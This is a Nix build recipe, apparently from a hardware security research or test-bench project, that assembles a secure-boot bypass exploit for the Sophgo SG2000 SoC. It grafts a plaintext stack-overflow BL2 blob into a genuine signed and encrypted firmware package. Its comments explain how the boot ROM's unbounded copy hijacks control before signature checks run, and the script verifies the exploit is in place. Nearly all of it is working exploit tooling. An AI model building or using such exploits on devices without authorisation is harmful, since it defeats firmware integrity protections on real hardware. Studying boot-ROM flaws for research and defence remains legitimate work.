# Graft the polyglot overflow BL2 onto a genuine signed(+encrypted) FIP to build
# the locked-SoC exploit (Phase 4a/4b of BENCH-PLAN.md). Reuses the real signed
# header (ROOT_PK / BL_PK / BL_PK_SIG / CHIP_CONF + CHIP_CONF_SIG / BL_EK /
# FIP_FLAGS) and the real encrypted second-stage images (MONITOR, LOADER_2ND,
# BLCP_2ND, LOADER_2ND_B) verbatim; only the BL2 slot is replaced with the
# plaintext overflow blob.
#
# Why plaintext BL2: the ROM verifies the key chain (VRK/VBK/VCC) and unwraps the
# image key on the header before it copies BL2, then copies BL2 raw (sized by the
# CRC-only BL2_IMG_SIZE) and decrypts it in place afterwards (DB2). The unbounded
# copy overruns the stack and hijacks control before DB2/VB2 run, so the header
# must be genuine but BL2 must stay plaintext, true even at SCS=02. See
# BENCH-PLAN.md section 12.
#
# Keyless: fipsign's `graft` subcommand just re-packs the FIP with the BL2 body
# swapped (make() recomputes BL2_IMG_SIZE, offsets, PARAM_CKSUM; the stale
# BL2_IMG_SIG is harmless because VB2 never runs).
{
  fetchFromGitHub,
  runCommand,
  python3,
  gnupatch,

  signedFip, # a genuine signed(+enc) FIP derivation carrying fip.bin
  overflowBl2, # the plaintext polyglot overflow BL2 blob (overflowBl2 { variant="polyglot"; })
}:
let
  fsblSrc = fetchFromGitHub {
    owner = "sophgo";
    repo = "fsbl";
    rev = "29edcfa0b5f999c8ea8f0759b0dd0038421e6c25";
    hash = "sha256-AzeOovjmxtwswNYpWViUKllKEVI9LLbcyqnOVcYPvGo=";
  };
in
runCommand "sg2000-chainload-fip-locked"
  {
    nativeBuildInputs = [
      python3
      gnupatch
    ];
  }
  ''
    mkdir -p $out
    cp ${fsblSrc}/plat/cv181x/fiptool.py ${fsblSrc}/plat/cv181x/fipsign.py .
    chmod +w fipsign.py
    patch -p1 < ${../fip-sign/fipsign.patch}

    python3 fipsign.py graft ${signedFip}/fip.bin ${overflowBl2} $out/fip.bin \
      2>&1 | tee $out/graft.log

    # Sanity: a real CVBL01 fip whose BL2 is the 0x3E400 overflow blob (polyglot
    # word present) and whose header still starts with the genuine magic.
    python3 - "$out/fip.bin" <<'PY'
    import sys, struct
    d = open(sys.argv[1], "rb").read()
    assert d[:6] == b"CVBL01", "not a CVBL01 fip"
    assert struct.unpack_from("<I", d, 0xD8)[0] == 0x3E400, "BL2_IMG_SIZE != overflow blob"
    assert b"\x6f\x00\x00\x14" in d, "polyglot word missing"
    print(f"grafted locked exploit ok: {len(d):#x} bytes")
    PY
    echo "grafted locked exploit: $out/fip.bin"
  ''
